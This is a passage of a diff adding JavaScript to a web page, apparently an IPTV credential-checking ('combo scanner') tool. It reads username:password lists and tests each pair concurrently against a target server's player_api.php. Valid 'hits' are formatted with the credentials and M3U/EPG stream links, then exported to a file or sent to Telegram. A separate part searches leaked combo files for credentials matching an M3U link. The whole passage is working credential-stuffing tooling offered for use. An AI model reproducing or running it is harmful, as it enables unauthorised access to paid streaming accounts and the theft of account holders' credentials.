+        return `\n${titleEmoji} ${title}\n${cleanSeparator} ${notFoundMsg} ${cleanSeparator}`;
+      }
+      const names = list.map(c => (c.category_name || "").toUpperCase()).join(` ${cleanSeparator} `);
+      return `\n${titleEmoji} ${title}\n${cleanSeparator} ${names} ${cleanSeparator}`;
+    };
+    categoryText += `\n${theme.line}` + formatCategoryList(emojis.emojiChannels, "CHANNELS", info.live_categories, config.channelSeparator, "NO CHANNELS FOUND");
+    categoryText += `\n${theme.line}` + formatCategoryList(emojis.emojiMovies,   "MOVIES",   info.vod_categories,  config.movieSeparator,   "NO MOVIES FOUND");
+    categoryText += `\n${theme.line}` + formatCategoryList(emojis.emojiSeries,   "SERIES",   info.series_categories, config.seriesSeparator, "NO SERIES FOUND");
+  } else {
+    const cleanChannelSep = (config.channelSeparator || "•").trim();
+    const cleanMovieSep   = (config.movieSeparator || "•").trim();
+    const cleanSeriesSep  = (config.seriesSeparator || "•").trim();
+
+    categoryText =
+`\n${theme.line}
+${emojis.emojiChannels} CHANNELS
+${cleanChannelSep} H I D D E N ${cleanChannelSep}
+${theme.line}
+${emojis.emojiMovies} MOVIES
+${cleanMovieSep} H I D D E N ${cleanMovieSep}
+${theme.line}
+${emojis.emojiSeries} SERIES
+${cleanSeriesSep} H I D D E N ${cleanSeriesSep}`;
+  }
+
+  // Footer date/time
+  const now = new Date();
+  const dateString = now.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
+  const timeString = now.toTimeString().slice(0, 5);
+
+  const header =
+`${theme.line}
+${theme.badgeL}  ꪶⅈꪮꪀ 𝚂𝚃𝙰𝙻𝙺𝙴𝚁 ᘻ3SSᗩ10  ${theme.badgeR}
+${theme.line}`;
+
+  // ✅ Estilo mixto:
+  // - TECH: INLINE (compacto)
+  // - CREDS: BLOQUE (premium)
+  // - COUNTS: INLINE
+  // - LINKS: INLINE
+
+  const tech =
+[
+  L(theme, `${emojis.servidor} HOST`, `http://${host}`),
+  L(theme, `${emojis.emojiRealServer} REAL`, realServerUrl),
+  L(theme, `${emojis.emojiProtocol} PROTOCOL`, "http"),
+  L(theme, `${emojis.emojiLocation} LOCATION`, locationText),
+  L(theme, `${emojis.criada} CREATED`, formatCreatedDate(info.created_at)),
+  L(theme, `${emojis.expira} ENDS`, endsLineValue),
+  durationLineValue ? L(theme, `${emojis.emojiDuration} DURATION`, durationLineValue) : ""
+].filter(Boolean).join("\n");
+
+  const creds =
+[
+  B(theme, `👤 USERNAME`, safe(user)),
+  B(theme, `🔑 PASSWORD`, safe(pass)),
+].join("");
+
+  const statusBlock =
+[
+  L(theme, `${emojis.emojiTrial} TRIAL`, `[${info.is_trial == 1 ? "YES" : "NO"}]`),
+  L(theme, `${emojis.status} STATUS`, (info.status ? info.status.toUpperCase() : "INACTIVE")),
+  L(theme, `${emojis.conexoes} MAX CONNS`, `[${info.max_connections ?? "N/A"}]`),
+  L(theme, `${emojis.conectados} ACTIVE CONNS`, `[${info.active_cons ?? "0"}]`),
+  L(theme, `${emojis.emojiTimezone} TIMEZONE`, timezoneText),
+  L(theme, `${emojis.emojiMessage} MESSAGE`, messageText),
+  L(theme, `${emojis.hitsPor} HITS BY`, nick),
+].join("\n");
+
+  const links =
+[
+  L(theme, `${emojis.linkM3U} HOST M3U`, `http://${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`),
+  L(theme, `${emojis.emojiRealM3U} REAL M3U`, `${realServerUrl}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`),
+  L(theme, `${emojis.emojiEpgLink} EPG`, `http://${host}/xmltv.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`),
+].join("\n");
+
+  const totals =
+[
+  L(theme, `${emojis.emojiChannels} TOTAL CHANNELS`, `[${info.live_streams_count || 0}]`),
+  L(theme, `${emojis.emojiMovies} TOTAL MOVIES`, `[${info.vod_streams_count || 0}]`),
+  L(theme, `${emojis.emojiSeries} TOTAL SERIES`, `[${info.series_count || 0}]`),
+].join("\n");
+
+  const footer =
+`${theme.line}
+📆 DATE ${theme.bullet} ${dateString}
+⏰ TIME ${theme.bullet} ${timeString}
+⌨️ CODED BY ${theme.bullet} ᘻ3SSᗩ10 🇪🇸
+👀 GROUP ${theme.bullet} 🦁🧙🤹
+${theme.line}`;
+
+  const texto =
+`${header}
+${tech}
+
+${theme.sub}
+${creds}
+
+${theme.sub}
+${statusBlock}
+
+${theme.sub}
+${links}
+
+${theme.sub}
+${totals}
+${categoryText}
+
+${footer}`;
+
+  return texto;
+}
+
+async function mostrarHitNaTela(hit) {
+    let divResultado = document.getElementById('resultado');
+    if (!divResultado) {
+        divResultado = document.createElement('div');
+        divResultado.id = 'resultado';
+        const joinBox = document.querySelector('.join-box');
+        joinBox.parentNode.insertBefore(divResultado, joinBox.nextSibling);
+    }
+    const bloco = document.createElement('div');
+    bloco.className = 'hit-block';
+    const botoes = document.createElement('div');
+    botoes.className = 'hit-buttons';
+    const btnCopiar = document.createElement('button');
+    btnCopiar.textContent = 'COPY HIT';
+    btnCopiar.title = 'COPY TO CLIPBOARD';
+    
+    btnCopiar.onclick = () => {
+        const fallbackCopy = (text) => {
+            const textArea = document.createElement("textarea");
+            textArea.value = text;
+            textArea.style.position = "fixed";
+            textArea.style.top = "-9999px";
+            textArea.style.left = "-9999px";
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            try {
+                const successful = document.execCommand('copy');
+                if (successful) {
+                    alert('HIT COPIED TO CLIPBOARD!');
+                } else {
+                    alert('Copy failed. Your browser may not support this feature.');
+                }
+            } catch (err) {
+                alert('An error occurred while copying.');
+                console.error('Fallback execCommand failed:', err);
+            }
+            document.body.removeChild(textArea);
+        };
+
+        if (navigator.clipboard && window.isSecureContext) {
+            navigator.clipboard.writeText(hit).then(() => {
+                alert('HIT copied to clipboard!');
+            }).catch(err => {
+                console.error('Async clipboard API failed, trying fallback:', err);
+                fallbackCopy(hit);
+            });
+        } else {
+            fallbackCopy(hit);
+        }
+    };
+
+    botoes.appendChild(btnCopiar);
+    bloco.appendChild(botoes);
+    const texto = document.createElement('pre');
+    texto.textContent = hit;
+    bloco.appendChild(texto);
+    divResultado.appendChild(bloco);
+    divResultado.scrollTop = divResultado.scrollHeight;
+}
+
+async function getRealUserData(host, user, pass, printCategories) {
+    const baseUrl = `http://${host}/player_api.php?username=${user}&password=${pass}`;
+    try {
+        const userInfo = await fetchComTimeout(baseUrl).then(res => res.ok ? res.json() : Promise.reject('Invalid credentials'));
+
+        if (!userInfo.user_info || userInfo.user_info.auth !== 1) return null;
+
+        let categoryPromises = { live: Promise.resolve([]), vod: Promise.resolve([]), series: Promise.resolve([]) };
+        const fetchCategory = action => fetchComTimeout(`${baseUrl}&action=${action}`).then(res => res.ok ? res.json() : []).catch(() => []);
+        
+        if (printCategories) {
+            categoryPromises.live = fetchCategory('get_live_categories');
+            categoryPromises.vod = fetchCategory('get_vod_categories');
+            categoryPromises.series = fetchCategory('get_series_categories');
+        }
+        
+        const fetchAndCount = (action) => fetchComTimeout(`${baseUrl}&action=${action}`)
+            .then(res => res.ok ? res.json() : [])
+            .then(data => Array.isArray(data) ? data.length : 0)
+            .catch(() => 0);
+
+        const liveCountPromise = (userInfo.user_info.live_streams_count !== undefined && userInfo.user_info.live_streams_count > 0)
+            ? Promise.resolve(userInfo.user_info.live_streams_count) 
+            : fetchAndCount('get_live_streams');
+
+        const vodCountPromise = (userInfo.user_info.vod_streams_count !== undefined && userInfo.user_info.vod_streams_count > 0)
+            ? Promise.resolve(userInfo.user_info.vod_streams_count) 
+            : fetchAndCount('get_vod_streams');
+            
+        const seriesCountPromise = (userInfo.user_info.series_count !== undefined && userInfo.user_info.series_count > 0)
+            ? Promise.resolve(userInfo.user_info.series_count) 
+            : fetchAndCount('get_series');
+
+        const [
+            live_categories, 
+            vod_categories, 
+            series_categories,
+            live_streams_count,
+            vod_streams_count,
+            series_count
+        ] = await Promise.all([
+            categoryPromises.live,
+            categoryPromises.vod,
+            categoryPromises.series,
+            liveCountPromise,
+            vodCountPromise,
+            seriesCountPromise
+        ]);
+        
+        return {
+            ...userInfo.user_info,
+            server_info: userInfo.server_info,
+            timezone: userInfo.server_info?.timezone,
+            live_streams_count,
+            vod_streams_count,
+            series_count,
+            live_categories,
+            vod_categories,
+            series_categories,
+        };
+
+    } catch (error) {
+        console.warn(`API Error for ${user}:`, error.message || error);
+        return null;
+    }
+}
+
+// ==============================
+// TEMAS Y TIPOGRAFÍA
+// ==============================
+const themes = {
+  "pearl-carbon": {
+    vars: {
+      "--bg-main": "#2b2b33",
+      "--bg-main-2": "#3a3a47",
+      "--bg-card": "#3f3f50",
+      "--text-main": "#f0f0f3",
+      "--text-soft": "#c7c7c9",
+      "--accent-primary": "#d4af37",
+      "--accent-secondary": "#bda4ff",
+      "--accent-border": "#b8962f",
+      "--accent-mint": "#7df2d8",
+      "--border-soft": "#4a4a4f"
+    },
+    image: "img/pearl-carbon.jpg",
+    font: "https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap",
+    fontFamily: "'Inter', sans-serif"
+  },
+  "black-titanium": {
+    vars: {
+      "--bg-main": "#0d0d14",
+      "--bg-main-2": "#1a1a27",
+      "--bg-card": "#20203b",
+      "--text-main": "#cce6ff",
+      "--text-soft": "#99c2ff",
+      "--accent-primary": "#00ffe0",
+      "--accent-secondary": "#0066ff",
+      "--accent-border": "#00bba3",
+      "--accent-mint": "#33ffff",
+      "--border-soft": "#33334d"
+    },
+    image: "img/black-titanium.jpg",
+    font: "https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap",
+    fontFamily: "'Orbitron', monospace"
+  },
+  "dark-gold": {
+    vars: {
+      "--bg-main": "#2a1f0f",
+      "--bg-main-2": "#3a2b14",
+      "--bg-card": "#493a20",
+      "--text-main": "#fff5e6",
+      "--text-soft": "#e6d6b8",
+      "--accent-primary": "#ffd700",
+      "--accent-secondary": "#ffb347",
+      "--accent-border": "#f0c75e",
+      "--accent-mint": "#ffe0b2",
+      "--border-soft": "#664d33"
+    },
+    image: "img/dark-gold.jpg",
+    font: "https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;600;700&display=swap",
+    fontFamily: "'Cormorant Garamond', serif"
+  }
+};
+
+function applyTheme(themeName) {
+  const theme = themes[themeName];
+  for (const variable in theme.vars) {
+    document.documentElement.style.setProperty(variable, theme.vars[variable]);
+  }
+  document.body.setAttribute("data-theme", themeName);
+  const img = document.getElementById("theme-image");
+  if (img) img.src = theme.image;
+
+  // Fuente
+  let fontLink = document.getElementById("dynamic-font");
+  if (!fontLink) {
+    fontLink = document.createElement("link");
+    fontLink.id = "dynamic-font";
+    fontLink.rel = "stylesheet";
+    document.head.appendChild(fontLink);
+  }
+  fontLink.href = theme.font;
+  document.body.style.fontFamily = theme.fontFamily;
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  const selector = document.getElementById("theme");
+  if (!selector) return;
+
+  const savedTheme = localStorage.getItem("m3ssa10-theme") || "pearl-carbon";
+  selector.value = savedTheme;
+  applyTheme(savedTheme);
+
+  selector.addEventListener("change", () => {
+    const selected = selector.value;
+    applyTheme(selected);
+    localStorage.setItem("m3ssa10-theme", selected);
+  });
+});
+
+// ==============================
+// PANEL DE ESTADO
+// ==============================
+const startBtn = document.getElementById("startBtn");
+const stopBtn = document.getElementById("stopBtn");
+
+const scanStatusText = document.getElementById("scanStatusText");
+const scanSpeedEl = document.getElementById("scanSpeed");
+const scanProgressEl = document.getElementById("scanProgress");
+const hitsCountEl = document.getElementById("hitsCount");
+const badCountEl = document.getElementById("badCount");
+const scannedCountEl = document.getElementById("scannedCount");
+const totalCountEl = document.getElementById("totalCount");
+
+let scanParado = false;
+let todosHits = [];
+let ultimoHit = '';
+let velocidad = 0;
+
+// ==============================
+// ACTUALIZAR PANEL
+// ==============================
+function actualizarPanel(scanStatus, speed, scannedNum, totalNum, hitsNum, badNum) {
+  // Textos principales
+  if (scanStatusText) scanStatusText.textContent = scanStatus;
+  if (scanSpeedEl) scanSpeedEl.textContent = String(speed ?? 0);
+  if (hitsCountEl) hitsCountEl.textContent = String(hitsNum ?? 0);
+  if (badCountEl) badCountEl.textContent = String(badNum ?? 0);
+  if (scannedCountEl) scannedCountEl.textContent = String(scannedNum ?? 0);
+  if (totalCountEl) totalCountEl.textContent = String(totalNum ?? 0);
+
+  // Porcentaje con 1 decimal (y “mínimo visual” para que se note)
+  let percentFloat = (totalNum > 0) ? (scannedNum / totalNum) * 100 : 0;
+
+  if (scannedNum > 0 && percentFloat < 0.1) percentFloat = 0.1;
+  if (percentFloat > 100) percentFloat = 100;
+  if (percentFloat < 0) percentFloat = 0;
+
+  const pctText = percentFloat.toFixed(1) + "%";
+
+  // Barra
+  if (scanProgressEl) {
+    scanProgressEl.style.width = pctText;
+    // para controlar el 🦁 cuando está al 0%
+    scanProgressEl.dataset.p = (scannedNum <= 0 ? "0" : "1");
+  }
+
+  // Texto del %
+  const scanPercentTextEl = document.getElementById("scanPercentText");
+  if (scanPercentTextEl) scanPercentTextEl.textContent = pctText;
+}
+
+// ==============================
+// LIMITADOR DE CONCURRENCIA (evita bloqueo en móvil)
+// ==============================
+async function runPool(items, worker, limit = 4) {
+  const executing = new Set();
+
+  for (const item of items) {
+    if (scanParado) break;
+
+    // ⚠️ IMPORTANTE: que NUNCA rechace (para que Promise.race no reviente)
+    const p = (async () => {
+      try {
+        await worker(item);
+      } catch (e) {
+        console.warn("Worker error:", e);
+      }
+    })();
+
+    executing.add(p);
+    p.finally(() => executing.delete(p));
+
+    if (executing.size >= limit) {
+      await Promise.race(executing); // ya no rompe aunque haya errores
+    }
+  }
+
+  await Promise.allSettled(executing);
+}
+
+async function iniciarScan() {
+  if (!document.getElementById('host').value) return alert('Enter the host to scan!');
+  if (!document.getElementById('comboFile').files[0]) return alert('Select a .txt file with combos!');
+
+  scanParado = false;
+  startBtn.disabled = true;
+  stopBtn.disabled = false;
+
+  const existingResultDiv = document.getElementById('resultado');
+  if (existingResultDiv) existingResultDiv.innerHTML = '';
+
+  todosHits = [];
+  ultimoHit = '';
+  clearHitsSummary();
+
+  const nick = (document.getElementById('nick').value || '').trim() || 'FAWX';
+  const host = limparHost((document.getElementById('host').value || '').trim());
+  const file = document.getElementById('comboFile').files[0];
+  const combosTxt = await file.text();
+
+  const combos = combosTxt
+    .split(/\r?\n/)
+    .map(l => l.trim())
+    .filter(l => l && l.includes(':'));
+
+  const total = combos.length;
+
+  const numBots = parseInt(document.getElementById('numBots').value, 10) || 1;
+  const limit = Math.max(1, Math.min(numBots, 6)); // cap móvil
+
+  let hits = 0, invalidos = 0, testados = 0;
+
+  // === SPEED (velocidad real) ===
+  let t0 = Date.now();
+  let lastChecked = 0;
+
+  function updateSpeed(currentChecked) {
+    const now = Date.now();
+    const dt = (now - t0) / 1000;
+    const diff = currentChecked - lastChecked;
+    velocidad = dt > 0 ? Math.round(diff / dt) : 0;
+    t0 = now;
+    lastChecked = currentChecked;
+  }
+
+  async function processCombo(combo) {
+    if (scanParado) return;
+
+    // yield cada X iteraciones para que no congele la UI
+    if (testados % 25 === 0) await new Promise(r => setTimeout(r, 0));
+
+    const [userRaw, passRaw] = combo.split(/:(.*)/s);
+    const user = (userRaw || "").trim();
+    const pass = (passRaw || "").trim();
+
+    if (!user || !pass) {
+      testados++;
+      invalidos++;
+      updateSpeed(testados);
+      actualizarPanel('Scanning', velocidad, testados, total, hits, invalidos);
+      return;
+    }
+
+    let realInfo = null;
+    try {
+      realInfo = await getRealUserData(host, user, pass, false);
+    } catch (e) {
+      console.warn("getRealUserData error:", e);
+      realInfo = null;
+    }
+
+    if (realInfo) {
+      hits++;
+
+      const hitFormatado = formatarHit(
+        realInfo,
+        host,
+        user,
+        pass,
+        nick,
+        DEFAULT_EMOJIS,
+        DEFAULT_CONFIG,
+        { country: 'N/A', city: 'N/A', countryCode: 'N/A' }
+      );
+
+      ultimoHit = hitFormatado;
+      todosHits.push(hitFormatado);
+
+      // 1) panel derecho (rápido)
+      try {
+        addHitToSummary({
+          host,
+          user,
+          pass,
+          status: realInfo.status || 'ACTIVE',
+          exp: realInfo.exp_date
+            ? new Date(realInfo.exp_date * 1000).toLocaleDateString('es-ES')
+            : 'ILIMITADO'
+        });
+      } catch (e) {
+        console.warn("addHitToSummary error:", e);
+      }
+
+      // 2) Telegram (sin bloquear)
+      try {
+        if (config?.tgmth) sht(hitFormatado);
+      } catch (e) {
+        console.warn("Telegram send error:", e);
+      }
+
+      // 3) visor grande (más pesado)
+      try {
+        await mostrarHitNaTela(hitFormatado);
+      } catch (e) {
+        console.warn("mostrarHitNaTela error:", e);
+      }
+
+    } else {
+      invalidos++;
+    }
+
+    testados++;
+    updateSpeed(testados);
+    actualizarPanel('Scanning', velocidad, testados, total, hits, invalidos);
+  }
+
+  // estado inicial
+  actualizarPanel('Scanning', 0, 0, total, 0, 0);
+
+  // pool real
+  await runPool(combos, processCombo, limit);
+
+  // fin
+  actualizarPanel(scanParado ? 'Stopped' : 'Finished', velocidad, testados, total, hits, invalidos);
+  startBtn.disabled = false;
+  stopBtn.disabled = true;
+
+  if (!scanParado) alert('SCAN FINISHED!');
+}
+
+function pararScan() {
+  scanParado = true;
+  startBtn.disabled = false;
+  stopBtn.disabled = true;
+  actualizarPanel('Stopped', velocidad, 0, 0, 0, 0);
+}
+
+function enviarTodosHits() {
+  if (!todosHits.length) return alert('NO HITS TO SEND!');
+
+  const filename = `[🦁][HITS].txt`;
+
+  const bom = "\uFEFF";
+  const content = bom + todosHits.join("\n\n\n");
+
+  const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
+
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+// ============================================
+// LEER M3U DESDE ENLACE + BUSCAR EN CARPETA .TXT
+// ============================================
+
+function parseM3UUrl() {
+  const input = document.getElementById('m3uUrl');
+  if (!input) return;
+
+  const url = input.value.trim();
+  if (!url) {
+    setM3UBox('🌐 Pega un enlace M3U primero.');
+    alert('🌐 Pega un enlace M3U');
+    return;
+  }
+
+  // Más robusto: permite parámetros en cualquier orden
+  const match = url.match(/[?&]username=([^&]+).*?[?&]password=([^&]+)/i);
+  if (!match) {
+    setM3UBox('❌ El enlace no contiene username/password.');
+    alert('❌ El enlace no contiene username/password');
+    return;
+  }
+
+  m3uCredentials = {
+    user: decodeURIComponent(match[1]),
+    pass: decodeURIComponent(match[2]),
+    url
+  };
+
+  setM3UBox(`✅ M3U detectado → <b>${escapeHtml(m3uCredentials.user)}</b>:<b>${escapeHtml(m3uCredentials.pass)}</b><br>📁 Ahora carga la carpeta de combos (.txt)`);
+}
+
+// Listener SEGURO (no revienta si el script carga antes del HTML)
+document.addEventListener('DOMContentLoaded', () => {
+  const folder = document.getElementById('comboFolder');
+  if (!folder) return;
+
+  folder.addEventListener('change', (e) => {
+    comboFiles = Array.from(e.target.files || []).filter(f => /\.txt$/i.test(f.name));
+    setM3UBox(`📁 ${comboFiles.length} archivos .txt cargados<br>🔍 Pulsa “BUSCAR EN COMBOS”`);
+  });
+});
+
+// Buscar coincidencias (modo estricto: user+pass exactos)
+async function searchM3UInCombos() {
+  if (!m3uCredentials) {
+    setM3UBox('❗ Primero pega el enlace M3U y pulsa buscar.');
+    return alert('Carga un M3U primero');
+  }
+  if (!comboFiles || comboFiles.length === 0) {
+    setM3UBox('❗ Primero carga la carpeta de combos (.txt).');
+    return alert('Carga la carpeta de combos');
+  }
+
+  setM3UBox('🔎 Buscando coincidencias...');
+
+  const results = [];
+
+  for (const file of comboFiles) {
+    const text = await file.text();
+    const lines = text.split(/\r?\n/);
+
+    for (let idx = 0; idx < lines.length; idx++) {
+      const l = lines[idx].trim();
+      if (!l || !l.includes(':')) continue;
+
+      // Soporta pass con ":" dentro
+      const parts = l.split(':');
+      const u = (parts[0] || '').trim();
+      const p = parts.slice(1).join(':').trim();
+
+      if (u === m3uCredentials.user || p === m3uCredentials.pass) {
+        results.push({
+          file: file.webkitRelativePath || file.name,
+          line: idx + 1,
+          combo: l
+        });
+      }
+    }
+  }
+
+  renderM3UResults(results);
+}
+
+function renderM3UResults(results) {
+  const box = document.getElementById('m3uResult');
+  if (!box) return;
+
+  if (!results || results.length === 0) {
+    box.innerHTML = '❌ No se encontraron coincidencias';
+    return;
+  }
+
+  box.innerHTML = `
+    ✅ Coincidencias: <b>${results.length}</b><br><br>
+    ${results.map(r => `
+      <div class="hit-item" style="padding:10px; border:1px solid rgba(255,255,255,.12); border-radius:10px; margin-bottom:10px;">
+        📄 <b>${escapeHtml(r.file)}</b><br>
+        📍 Línea ${r.line}<br>
+        🤹 <code>${escapeHtml(r.combo)}</code>
+      </div>
+    `).join('')}
+  `;
+}
+
+function clearM3USearch() {
+  // limpiar variables
+  m3uCredentials = null;
+  comboFiles = [];
+
+  // limpiar inputs
+  const m3uInput = document.getElementById('m3uUrl');
+  if (m3uInput) m3uInput.value = '';
+
+  const folder = document.getElementById('comboFolder');
+  if (folder) folder.value = ''; // resetea el selector de carpeta
+
+  // limpiar salida
+  setM3UBox('🧹 Búsqueda limpiada. Pega un M3U y carga una carpeta para buscar.');
+
+  // opcional: scroll arriba del panel de resultados
+  const box = document.getElementById('m3uResult');
+  if (box) box.scrollTop = 0;
+}
+
+</script>
+
+</body>
+</html>
